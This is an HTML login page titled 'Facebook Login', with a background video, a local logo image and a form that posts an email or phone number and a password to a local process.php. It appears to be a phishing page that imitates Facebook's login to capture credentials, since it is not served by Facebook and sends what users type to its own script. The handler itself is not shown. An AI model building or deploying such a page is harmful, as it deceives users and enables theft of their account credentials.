<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <!-- Link to external CSS -->
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <!-- Background Video -->
  <video autoplay muted loop id="background-video">
    <source src="backgroundplay/video_2025-01-07_08-37-55.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <!-- Login Content -->
  <div class="login-container">
    <div class="login-box">
      <div class="logo-container">
        <img src="backgroundplay/photo_2025-01-07_08-48-38.jpg" alt="Logo" class="logo">
      </div>
      <p class="message">You must log in first.</p>
      <form action="process.php" method="POST">
        <input type="text" name="email" placeholder="Email address or phone number" class="input-field" required>
        <input type="password" name="password" placeholder="Password" class="input-field" required>
        <button type="submit" class="login-button">Log In</button>
      </form>
      <button class="create-account-button">Create New Account</button>
    </div>
  </div>
</body>
</html>
